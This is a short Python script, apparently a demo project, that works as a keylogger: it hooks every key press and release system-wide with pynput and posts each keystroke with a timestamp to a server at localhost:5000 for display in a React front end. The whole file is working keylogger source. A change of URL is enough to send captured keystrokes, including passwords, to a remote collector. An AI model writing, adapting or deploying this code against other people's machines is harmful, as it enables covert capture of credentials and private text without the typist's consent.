import requests
from pynput import keyboard
from datetime import datetime
import tkinter as tk # Needed if you want the local GUI box

# The URL of your Node.js server
API_URL = "http://localhost:5000/api/logs"

def on_press(key):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # Format matching the demo image: time | event | key
        log_entry = {
            "time": timestamp,
            "event": "pressed",
            "key": str(key).replace("'", "")
        }
        requests.post(API_URL, json=log_entry)
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = {
            "time": timestamp,
            "event": "released",
            "key": str(key).replace("'", "")
        }
        requests.post(API_URL, json=log_entry)
    except Exception as e:
        print(f"Error: {e}")

print("Keylogger is running... Type anywhere to see it in React.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()